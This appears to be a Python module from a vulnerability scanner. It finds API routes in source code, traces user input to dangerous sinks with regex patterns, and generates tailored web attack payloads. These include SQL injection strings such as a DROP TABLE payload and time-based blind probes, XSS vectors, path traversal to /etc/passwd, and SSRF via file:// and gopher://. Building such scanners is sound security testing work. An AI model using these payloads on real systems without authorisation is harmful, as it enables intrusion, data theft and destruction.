#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Shannon-Inspired Context Analyzer - 白盒驱动的黑盒扫描增强模块

核心思路（借鉴 Shannon 的白盒+黑盒融合）：
1. 从源码中发现攻击面（API端点、变量名、路由模式）
2. 根据源码线索生成针对性payload，减少误报、提高检出率
3. 实现 Source → Sink 数据流追踪

用法:
    from shannon_context import ContextAnalyzer
    ctx = ContextAnalyzer()
    ctx.add_file_analysis(results_from_file_analyzer)
    contextual_payloads = ctx.generate_sqli_payloads(param_name='id', var_type='int')
"""

import os
import re
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field


# ==================== 上下文数据模型 ====================

@dataclass
class SourceInfo:
    """从源码分析得到的攻击面信息"""
    file_path: str
    var_name: str = ""           # 变量名 (如 $_GET['id'], req.query.page)
    var_type: str = ""           # 推测类型: int, string, path, url, bool, json
    raw_code: str = ""           # 源码行内容
    sink_function: str = ""      # 危险函数 (execute, eval, system, render...)
    source_type: str = ""        # 来源类型: GET_PARAM, POST_BODY, COOKIE, HEADER, PATH
    risk_level: str = "medium"   # 风险等级


@dataclass
class APIEndpoint:
    """从源码发现的API端点"""
    method: str                  # GET, POST, PUT, DELETE...
    path: str                    # /api/users/{id}
    file_path: str               # 定义的文件
    line_number: int = 0
    framework: str = ""          # express, flask, django, spring, fastapi
    raw_code: str = ""


@dataclass  
class ContextData:
    """综合上下文数据"""
    source_vars: List[SourceInfo] = field(default_factory=list)     # 可注入的变量
    api_endpoints: List[APIEndpoint] = field(default_factory=list)  # API端点
    file_extensions: Dict[str, int] = field(default_factory=dict)   # 文件类型统计
    technologies: List[str] = field(default_factory=list)           # 检测到的技术栈
    languages: Dict[str, int] = field(default_factory=dict)         # 语言统计


# ==================== 源码API端点发现器 ====================

class APIEndpointDiscoverer:
    """从源码中发现API端点（类似 Shannon 的路由解析）"""

    # Express.js 路由模式
    EXPRESS_PATTERNS = [
        (r'\.get\s*\(\s*["\']([^"\']+)["\']', 'GET'),
        (r'\.post\s*\(\s*["\']([^"\']+)["\']', 'POST'),
        (r'\.put\s*\(\s*["\']([^"\']+)["\']', 'PUT'),
        (r'\.delete\s*\(\s*["\']([^"\']+)["\']', 'DELETE'),
        (r'\.patch\s*\(\s*["\']([^"\']+)["\']', 'PATCH'),
    ]

    # Flask 路由模式
    FLASK_PATTERNS = [
        (r'@app\.route\s*\(\s*["\']([^"\']+)["\'][^\)]*methods?\s*=\s*\[([^\]]+)\]', None),  # 特殊处理
    ]

    # Django URL模式
    DJANGO_PATTERNS = [
        (r'url\s*\(\s*[r]?"?([^"\']+/[^"\']*)"', 'GET'),
        (r're_path\s*\(\s*r?"([^"]+)"', 'GET'),
        (r'regex\s*=\s*r?"([^"]+)"', 'GET'),
    ]

    # Spring Boot @RequestMapping
    SPRING_PATTERNS = [
        (r'@GetMapping\s*\(\s*["\']([^"\']+)["\']', 'GET'),
        (r'@PostMapping\s*\(\s*["\']([^"\']+)["\']', 'POST'),
        (r'@PutMapping\s*\(\s*["\']([^"\']+)["\']', 'PUT'),
        (r'@DeleteMapping\s*\(\s*["\']([^"\']+)["\']', 'DELETE'),
        (r'@RequestMapping\s*\(\s*method\s*=\s*RequestMethod\.(GET|POST|PUT|DELETE)\s*,\s*value\s*=\s*["\']([^"\']+)["\']', None),
    ]

    # FastAPI 路由模式
    FASTAPI_PATTERNS = [
        (r'@router\.(get|post|put|delete|patch)\s*\(\s*["\']([^"\']+)["\']', None),
        (r'app\.(get|post|put|delete|patch)\s*\(\s*["\']([^"\']+)["\']', None),
    ]

    @classmethod
    def discover_from_file(cls, filepath: str) -> List[APIEndpoint]:
        """从单个文件发现API端点"""
        endpoints = []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                lines = content.split('\n')
        except (IOError, PermissionError):
            return endpoints

        basename = os.path.basename(filepath).lower()

        # Express.js
        for i, line in enumerate(lines, 1):
            for pattern, method in cls.EXPRESS_PATTERNS:
                matches = re.findall(pattern, line)
                for path_match in matches:
                    path = '/' + path_match if not path_match.startswith('/') else path_match
                    endpoints.append(APIEndpoint(
                        method=method, path=path, file_path=filepath,
                        line_number=i, framework='express', raw_code=line.strip()[:200]
                    ))

        # Flask (带特殊处理)
        for i, line in enumerate(lines, 1):
            flask_match = re.search(r'@app\.route\s*\(\s*["\']([^"\']+)["\']', line)
            if flask_match:
                path = flask_match.group(1)
                # 从后续行找methods参数
                methods_str = ''
                for j in range(i, min(i+5, len(lines))):
                    if 'methods' in lines[j]:
                        methods_str = lines[j]
                        break
                if 'GET' in methods_str and 'POST' not in methods_str:
                    methods = ['GET']
                elif 'POST' in methods_str and 'GET' not in methods_str:
                    methods = ['POST']
                elif 'PUT' in methods_str:
                    methods = ['PUT']
                else:
                    methods = ['GET', 'POST']
                for m in methods:
                    endpoints.append(APIEndpoint(
                        method=m, path=path, file_path=filepath,
                        line_number=i, framework='flask', raw_code=line.strip()[:200]
                    ))

        # Django
        for i, line in enumerate(lines, 1):
            for pattern, default_method in cls.DJANGO_PATTERNS:
                matches = re.findall(pattern, line)
                for path_match in matches:
                    if isinstance(path_match, tuple):
                        path = path_match[0] if path_match[0] else path_match[1]
                    else:
                        path = path_match
                    endpoints.append(APIEndpoint(
                        method=default_method, path=path, file_path=filepath,
                        line_number=i, framework='django', raw_code=line.strip()[:200]
                    ))

        # Spring Boot
        for i, line in enumerate(lines, 1):
            for pattern, _ in cls.SPRING_PATTERNS:
                matches = re.findall(pattern, line)
                for path_match in matches:
                    if isinstance(path_match, tuple):
                        parts = [p for p in path_match if p]
                        if any(p in ('GET', 'POST', 'PUT', 'DELETE') for p in parts):
                            method = [p for p in parts if p in ('GET', 'POST', 'PUT', 'DELETE')][0]
                            path = [p for p in parts if p not in ('GET', 'POST', 'PUT', 'DELETE')][-1] if len(parts) > 1 else '/'
                        else:
                            method = default_method or 'GET'
                            path = path_match[0] if path_match[0] else '/'
                    else:
                        method = 'GET'
                        path = path_match
                    endpoints.append(APIEndpoint(
                        method=method, path=path, file_path=filepath,
                        line_number=i, framework='spring', raw_code=line.strip()[:200]
                    ))

        # FastAPI
        for i, line in enumerate(lines, 1):
            for pattern, _ in cls.FASTAPI_PATTERNS:
                matches = re.findall(pattern, line)
                for method, path in matches:
                    endpoints.append(APIEndpoint(
                        method=method.upper(), path=path, file_path=filepath,
                        line_number=i, framework='fastapi', raw_code=line.strip()[:200]
                    ))

        return endpoints

    @classmethod
    def discover_from_files(cls, file_list: list) -> List[APIEndpoint]:
        """从文件列表批量发现API端点"""
        all_endpoints = []
        for fpath in file_list:
            all_endpoints.extend(cls.discover_from_file(fpath))
        return all_endpoints


# ==================== Source → Sink 数据流追踪器 ====================

class DataFlowTracer:
    """轻量级 Source → Sink 数据流追踪（Shannon 核心能力 Python版）"""

    # Python危险Sink函数
    PYTHON_SINKS = {
        'SQL': r'cursor\.execute|\.executeQuery|connection\.query',
        'Command': r'os\.system|subprocess\..*shell|exec\(|eval\(',
        'FileInclude': r'(?:include|require)(_once)?\s*\(',
        'Deserialization': r'pickle\.(?:load|loads)|yaml\.(?:load|safe_load)',
    }

    # PHP危险Sink函数
    PHP_SINKS = {
        'SQL': r'(?:mysql_query|mysqli_query|pg_query)\s*\(.*(?:\.|\$)',
        'Command': r'(?:system|passthru|exec|shell_exec|proc_open)\s*\(',
        'Eval': r'\beval\s*\(|preg_replace.*\[\'e\'\]',
        'Deserialization': r'unserialize\s*\(',
        'FileInclude': r'(?:include|require)(_once)?\s*\(',
    }

    # JS危险Sink函数
    JS_SINKS = {
        'Eval': r'eval\s*\(|new Function\s*\(',
        'XSS': r'\.innerHTML\s*=|\.outerHTML\s*=|document\.write\s*\(|dangerouslySetInnerHTML',
        'Command': r'spawnSync\s*\(.*sh\b|child_process\.execSync\s*\(',
    }

    @classmethod
    def trace_python(cls, filepath: str) -> List[Dict[str, Any]]:
        """追踪Python代码中的数据流"""
        traces = []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                lines = content.split('\n')
        except (IOError, PermissionError):
            return traces

        # 追踪 HTTP 入口 → 危险函数
        http_source_patterns = [
            (r'request\.(args|form|json|values|params)', 'HTTP_PARAM'),
            (r'request\.get_json', 'HTTP_JSON'),
            (r'@request\.args', 'HTTP_ARGS'),
        ]

        for i, line in enumerate(lines, 1):
            # 找HTTP数据源
            for pat, src_type in http_source_patterns:
                if re.search(pat, line):
                    var_match = re.search(r'\b(\w+)\s*=', line)
                    if var_match:
                        var_name = var_match.group(1)
                        # 追踪这个变量是否进入了危险函数（在以下N行内）
                        follow_lines = lines[i:min(i+20, len(lines))]
                        for sink_name, sink_pat in cls.PYTHON_SINKS.items():
                            for j, follow_line in enumerate(follow_lines):
                                if re.search(sink_pat, follow_line) and var_name in follow_line:
                                    traces.append({
                                        'source': src_type,
                                        'var_name': var_name,
                                        'sink': sink_name,
                                        'source_line': i,
                                        'sink_line': i + j,
                                        'source_code': line.strip()[:100],
                                        'sink_code': follow_line.strip()[:100],
                                        'risk': 'critical' if sink_name in ('Command', 'Deserialization') else 'high',
                                        'file': filepath,
                                    })
                        break

        # 追踪用户输入直接拼接SQL（更通用的模式）
        sql_concat_patterns = [
            r'["\'].*SELECT.*["\'].*\+',
            r'["\'].*INSERT.*["\'].*\+',
            r'["\'].*UPDATE.*["\'].*\+',
            r'["\'].*DELETE.*FROM.*["\'].*\+',
            r'f["\'].*(?:SELECT|INSERT|UPDATE|DELETE)',
        ]

        for i, line in enumerate(lines, 1):
            for pat in sql_concat_patterns:
                if re.search(pat, line):
                    # 检查是否有用户输入（request.args等）在附近
                    nearby = lines[max(0,i-5):min(i+5, len(lines))]
                    has_user_input = any(re.search(r'request\.|user_|input_|param', l) for l in nearby)
                    if has_user_input:
                        traces.append({
                            'source': 'HTTP_PARAM',
                            'var_name': 'implicit',
                            'sink': 'SQL_CONCAT',
                            'source_line': i,
                            'sink_line': i,
                            'source_code': '',
                            'sink_code': line.strip()[:100],
                            'risk': 'critical',
                            'file': filepath,
                        })

        return traces

    @classmethod
    def trace_php(cls, filepath: str) -> List[Dict[str, Any]]:
        """追踪PHP代码中的数据流"""
        traces = []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
        except (IOError, PermissionError):
            return traces

        # 追踪 $_GET/$_POST → 危险函数
        for i, line in enumerate(lines, 1):
            input_match = re.search(r'\$_(GET|POST|REQUEST|COOKIE)\[["\'](\w+)["\']', line)
            if input_match:
                var_type = input_match.group(1)
                var_name = input_match.group(2)
                # 追踪同文件后续行
                follow_lines = lines[i:min(i+30, len(lines))]
                for sink_name, sink_pat in cls.PHP_SINKS.items():
                    for j, follow_line in enumerate(follow_lines):
                        if re.search(sink_pat, follow_line) and var_name in follow_line:
                            traces.append({
                                'source': f'{var_type}_PARAM',
                                'var_name': var_name,
                                'sink': sink_name,
                                'source_line': i,
                                'sink_line': i + j,
                                'source_code': line.strip()[:100],
                                'sink_code': follow_line.strip()[:100],
                                'risk': 'critical' if sink_name in ('Eval', 'Command') else 'high',
                                'file': filepath,
                            })

        # 追踪变量拼接SQL
        for i, line in enumerate(lines, 1):
            if re.search(r'(?:mysql_query|mysqli_query)\s*\(\s*.*\$.*\.?\$', line):
                traces.append({
                    'source': 'UNKNOWN',
                    'var_name': 'unknown',
                    'sink': 'SQL_QUERY_CONCAT',
                    'source_line': i,
                    'sink_line': i,
                    'source_code': '',
                    'sink_code': line.strip()[:100],
                    'risk': 'critical',
                    'file': filepath,
                })

        return traces

    @classmethod
    def trace_js(cls, filepath: str) -> List[Dict[str, Any]]:
        """追踪JavaScript代码中的数据流"""
        traces = []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
        except (IOError, PermissionError):
            return traces

        # 追踪 user input → innerHTML/eval
        for i, line in enumerate(lines, 1):
            # XSS sink: innerHTML
            if re.search(r'\.innerHTML\s*=\s*(?:.*(?:req\.query|params\.|request\.|location\.|window\.))', line):
                traces.append({
                    'source': 'HTTP_PARAM',
                    'var_name': 'user_input',
                    'sink': 'XSS_INNERHTML',
                    'source_line': i,
                    'sink_line': i,
                    'source_code': '',
                    'sink_code': line.strip()[:100],
                    'risk': 'critical',
                    'file': filepath,
                })

            # eval sink
            if re.search(r'eval\s*\(\s*(?:.*(?:req\.|params\.|location\.))', line):
                traces.append({
                    'source': 'HTTP_PARAM',
                    'var_name': 'user_input',
                    'sink': 'EVAL',
                    'source_line': i,
                    'sink_line': i,
                    'source_code': '',
                    'sink_code': line.strip()[:100],
                    'risk': 'critical',
                    'file': filepath,
                })

        # 追踪 req.body/req.query → SQL/命令执行
        for i, line in enumerate(lines, 1):
            input_match = re.search(r'(?:req\.query|req\.body|params)\[(["\'])(\w+)\1', line)
            if input_match:
                var_name = input_match.group(2)
                follow_lines = lines[i:min(i+30, len(lines))]
                for sink_name, sink_pat in cls.JS_SINKS.items():
                    for j, follow_line in enumerate(follow_lines):
                        if re.search(sink_pat, follow_line) and var_name in follow_line:
                            traces.append({
                                'source': 'HTTP_PARAM',
                                'var_name': var_name,
                                'sink': sink_name,
                                'source_line': i,
                                'sink_line': i + j,
                                'source_code': line.strip()[:100],
                                'sink_code': follow_line.strip()[:100],
                                'risk': 'critical',
                                'file': filepath,
                            })

        return traces


# ==================== 上下文感知的 Payload 生成器 ====================

class ContextAwarePayloadGenerator:
    """根据源码分析结果生成针对性payload（Shannon核心能力）"""

    @staticmethod
    def generate_sqli_payloads(var_name: str = '', var_type: str = '', context: Dict = None) -> List[Dict]:
        """
        根据变量名和类型生成针对性SQLi payload
        
        Args:
            var_name: 变量名（如 'id', 'username', 'page'）
            var_type: 变量类型（'int', 'string', 'path', 'url', ''=unknown）
            context: 额外的上下文信息（框架、编码要求等）
        """
        payloads = []

        # 通用基础payloads
        base_payloads = [
            ("'", "单引号注入"),
            ("' OR '1'='1--", "OR tautology"),
            ("' AND 1=1--", "AND true"),
            ("' AND 1=2--", "AND false (对比用)"),
        ]

        # 根据变量名推断
        name_inference = {
            'id': 'int',
            'uid': 'int',
            'user_id': 'int',
            'page': 'int',
            'offset': 'int',
            'limit': 'int',
            'sort': 'string',
            'order': 'string',
            'username': 'string',
            'name': 'string',
            'email': 'string',
            'file': 'path',
            'path': 'path',
            'url': 'url',
            'redirect': 'url',
            'query': 'string',
            'search': 'string',
            'keyword': 'string',
            'category': 'string',
        }

        if var_name and var_name.lower() in name_inference:
            inferred = name_inference[var_name.lower()]
            if not var_type:
                var_type = inferred

        # 根据类型定制payloads
        if var_type == 'int' or (not var_type and any(kw in var_name.lower() for kw in ['id', 'page', 'offset', 'limit'])):
            payloads.extend([
                ("1 OR 1=1", "数字注入-tautology"),
                ("-1 UNION SELECT NULL--", "UNION null列数探测"),
                ("-1 UNION SELECT 1,2,3--", "UNION数值列探测"),
                ("1; DROP TABLE users--", "DDL语句终结"),
                ("1 AND SLEEP(5)--", "时间盲注"),
                ("1 AND benchmark(10000000,SHA1('test'))--", "MySQL耗时注入"),
            ])
        elif var_type == 'path' or (not var_type and any(kw in var_name.lower() for kw in ['file', 'path', 'dir'])):
            payloads.extend([
                ("../../../../etc/passwd", "路径遍历-Unix"),
                ("..\\..\\..\\..\\windows\\system.ini", "路径遍历-Windows"),
                ("....//....//etc/passwd", "绕过检测的遍历"),
            ])
        elif var_type == 'url' or (not var_type and any(kw in var_name.lower() for kw in ['url', 'redirect', 'next', 'goto'])):
            payloads.extend([
                ("http://127.0.0.1/admin", "SSRF-内网"),
                ("file:///etc/passwd", "SSRF-file协议"),
                ("gopher://127.0.0.1:6379/", "SSRF-gopher协议"),
            ])
        else:
            # string类型（username等）- 针对认证绕过
            payloads.extend([
                ("' OR '1'='1", "字符串OR注入"),
                ("admin'--", "用户名绕过"),
                ("' OR ''='", "空字符串注入"),
                ("\\'\nOR '1'='1--", "换行符绕过"),
                ("admin%27%20OR%20%271%27=%271--", "URL编码注入"),
            ])

        # 如果上下文中有框架信息，添加框架特定的payloads
        if context:
            framework = context.get('framework', '').lower()
            if framework in ('django',):
                payloads.append(("' OR DjangoIntegrityError'='1", "Django特有错误注入"))
            elif framework == 'flask':
                payloads.append(("' OR Flask-SQLAlchemy'='1", "Flask-SQLAlchemy错误注入"))
            elif framework in ('spring', 'java'):
                payloads.append(("1; SHOW TABLES--", "Java/Spring SQL注入"))

        return [
            {'payload': p, 'description': d}
            for p, d in payloads
        ]

    @staticmethod
    def generate_xss_payloads(var_name: str = '', context: Dict = None) -> List[Dict]:
        """根据上下文生成针对性XSS payload"""
        base_payloads = [
            ("<script>alert(1)</script>", "经典script"),
            ("<img src=x onerror=alert(1)>", "img onerror"),
            ("<svg/onload=alert(1)>", "SVG onload"),
            ("javascript:alert(1)", "JS协议"),
        ]

        # 根据变量名推断注入上下文
        payload_variants = {
            'search': [  # search参数通常在input value中回显
                ('<input value="<script>alert(1)</script>"', "value中注入"),
                ("onfocus=alert(1) autofocus", "focus事件触发"),
            ],
            'name': [   # name参数可能在innerHTML/div中回显
                ('"><script>alert(1)</script><"', "闭合标签后注入"),
                ("' onclick='alert(1)", "事件属性注入"),
            ],
            'file': [   # file参数可能涉及重定向或文件包含
                ("<iframe src=javascript:alert(1)>", "iframe JS注入"),
            ],
        }

        for p, d in base_payloads:
            yield {'payload': p, 'description': d}

        if var_name and var_name.lower() in payload_variants:
            for p, d in payload_variants[var_name.lower()]:
                yield {'payload': p, 'description': f"上下文适配-{d}"}

    @staticmethod
    def generate_lfi_payloads(var_name: str = '', context: Dict = None) -> List[Dict]:
        """根据变量名生成LFI payload"""
        paths = ['../../../../etc/passwd', '..\\..\\windows\\system.ini']
        encodings = [
            '../../../../etc/passwd',           # 原始
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',   # URL编码
            '....//....//....//etc/passwd',      # 绕过
        ]

        for i, p in enumerate(paths):
            yield {'payload': p, 'description': f'LFI-{i+1}'}
            if encodings[i] != p:
                yield {'payload': encodings[i], 'description': f'LFI编码绕过-{i+1}'}


# ==================== 综合上下文分析器 ====================

class ContextAnalyzer:
    """综合上下文分析器 — Shannon白盒能力的核心"""

    def __init__(self):
        self.context = ContextData()
        self.data_flows = []  # Source→Sink追踪结果
        self.found_endpoints = []  # 发现的API端点

    def add_file_analysis(self, file_findings: list, scan_path: str = '') -> 'ContextAnalyzer':
        """从文件分析结果中提取上下文信息"""
        from file_analyzer import FileAnalyzer, DANGEROUS_PATTERNS
        
        file_list = []
        for f in file_findings:
            if hasattr(f, 'file_path'):
                fp = f.file_path
            else:
                fp = f.get('file_path', '') if isinstance(f, dict) else str(f)
            if fp and os.path.isfile(fp):
                file_list.append(fp)

        # 收集文件统计
        ext_to_lang = {
            '.py': 'Python', '.js': 'JavaScript', '.ts': 'TypeScript', '.php': 'PHP',
            '.java': 'Java', '.yml': 'YAML', '.yaml': 'YAML', '.json': 'JSON',
            '.conf': 'Config', '.env': 'EnvFile', '.vue': 'Vue.js', '.html': 'HTML',
        }

        ext_counts = {}
        lang_counts = {}
        for fp in file_list:
            ext = os.path.splitext(fp)[1].lower() or '(无)'
            ext_counts[ext] = ext_counts.get(ext, 0) + 1
            lang = ext_to_lang.get(ext, ext)
            lang_counts[lang] = lang_counts.get(lang, 0) + ext_counts[ext] - lang_counts.get(lang, 0)

        self.context.file_extensions = ext_counts
        self.context.languages = lang_counts

        # 从文件发现API端点
        for fp in file_list:
            ext = os.path.splitext(fp)[1].lower()
            if ext in ('.py', '.js', '.ts', '.php', '.java', '.vue'):
                endpoints = APIEndpointDiscoverer.discover_from_file(fp)
                self.found_endpoints.extend(endpoints)

        # 数据流追踪
        for fp in file_list:
            ext = os.path.splitext(fp)[1].lower()
            if ext == '.py':
                self.data_flows.extend(DataFlowTracer.trace_python(fp))
            elif ext == '.php':
                self.data_flows.extend(DataFlowTracer.trace_php(fp))
            elif ext in ('.js', '.ts'):
                self.data_flows.extend(DataFlowTracer.trace_js(fp))

        # 从危险代码模式提取变量信息
        for fp in file_list:
            try:
                with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    lines = content.split('\n')
            except (IOError, PermissionError):
                continue

            # 检测框架
            if re.search(r'from flask|import flask', content):
                self.context.technologies.append('Flask')
            elif re.search(r'django|from django', content):
                self.context.technologies.append('Django')
            elif re.search(r'from express|require\(.*express', content):
                self.context.technologies.append('Express.js')
            elif re.search(r'@RestController|@Controller|@GetMapping', content):
                self.context.technologies.append('Spring Boot')
            elif re.search(r'from fastapi|import FastAPI', content):
                self.context.technologies.append('FastAPI')

            # 提取PHP输入源变量
            php_matches = re.findall(r'\$_(GET|POST|REQUEST)\[["\'](\w+)["\']', content)
            for var_type, var_name in php_matches:
                self.context.source_vars.append(SourceInfo(
                    file_path=fp,
                    var_name=var_name,
                    var_type='string',
                    source_type=f'{var_type}_PARAM',
                    sink_function='',
                    risk_level='high',
                    raw_code=''
                ))

            # 提取Python request参数
            py_matches = re.findall(r'request\.(args|form|json|values)\[(?:["\'](\w+)["\'])', content)
            for param_source, var_name in py_matches:
                if var_name:
                    self.context.source_vars.append(SourceInfo(
                        file_path=fp,
                        var_name=var_name,
                        var_type='string' if param_source != 'args' else 'mixed',
                        source_type='HTTP_PARAM',
                        sink_function='',
                        risk_level='high',
                        raw_code=''
                    ))

            # 提取JS req.query/req.body参数
            js_matches = re.findall(r'req\.(query|body)\[["\'](\w+)["\']', content)
            for param_source, var_name in js_matches:
                self.context.source_vars.append(SourceInfo(
                    file_path=fp,
                    var_name=var_name,
                    var_type='string',
                    source_type=f'HTTP_{param_source.upper()}',
                    sink_function='',
                    risk_level='high',
                    raw_code=''
                ))

        return self

    def get_contextual_sqli_context(self, target_url: str) -> Dict:
        """为URL扫描获取SQLi上下文"""
        parsed_params = {}
        query = urlparse(target_url).query
        if query and '=' in query:
            for part in query.split('&'):
                if '=' in part:
                    k, v = part.split('=', 1)
                    parsed_params[k.lower()] = v

        # 查找匹配的源变量
        matched_vars = []
        for sv in self.context.source_vars:
            if sv.var_name.lower() in parsed_params:
                matched_vars.append(sv)
            # 也检查参数名模式
            for ep in self.found_endpoints:
                if sv.file_path == ep.file_path and ep.path:
                    if sv.var_name in ep.path:
                        matched_vars.append(sv)

        framework = ''
        for tech in self.context.technologies:
            if tech.lower() in ('django', 'flask', 'fastapi', 'spring', 'express'):
                framework = tech
                break

        return {
            'matched_vars': matched_vars,
            'framework': framework,
            'data_flows': [f for f in self.data_flows if f.get('sink') == 'SQL_CONCAT' or f.get('sink').startswith('SQL')],
            'language_flow_count': sum(1 for f in self.data_flows if 'sql' in f.get('sink', '').lower() or 'SQL' in f.get('sink', '')),
        }

    def get_contextual_xss_context(self, target_url: str) -> Dict:
        """为URL扫描获取XSS上下文"""
        parsed_params = {}
        query = urlparse(target_url).query
        if query and '=' in query:
            for part in query.split('&'):
                if '=' in part:
                    k, v = part.split('=', 1)
                    parsed_params[k.lower()] = v

        # 查找可能渲染到HTML的变量
        matched_vars = []
        for sv in self.context.source_vars:
            if sv.var_name.lower() in parsed_params:
                matched_vars.append(sv)

        has_innerhtml = any('XSS_INNERHTML' in f.get('sink', '') for f in self.data_flows)
        has_eval = any(f.get('sink') == 'EVAL' for f in self.data_flows)

        return {
            'matched_vars': matched_vars,
            'has_innerhtml_sink': has_innerhtml,
            'has_eval_sink': has_eval,
            'language_flow_count': sum(1 for f in self.data_flows if 'XSS' in f.get('sink', '') or 'EVAL' in f.get('sink', '')),
        }

    def get_discovered_endpoints(self) -> List[APIEndpoint]:
        """返回发现的API端点"""
        return self.found_endpoints

    def get_summary(self) -> Dict:
        """获取上下文分析摘要（用于报告）"""
        return {
            'files_analyzed': sum(self.context.file_extensions.values()),
            'file_types': self.context.file_extensions,
            'languages': self.context.languages,
            'technologies': self.context.technologies,
            'api_endpoints_found': len(self.found_endpoints),
            'endpoints_summary': [
                f"{ep.method} {ep.path} ({ep.framework})" for ep in self.found_endpoints[:10]
            ],
            'data_flows_found': len(self.data_flows),
            'flow_details': [
                f"{f['source']} → {f['sink']} ({os.path.basename(f['file'])}:{f['source_line']})"
                for f in self.data_flows[:10]
            ],
            'context_vars_found': len(self.context.source_vars),
        }


# URL解析辅助函数（顶层，避免循环引用）
from urllib.parse import urlparse
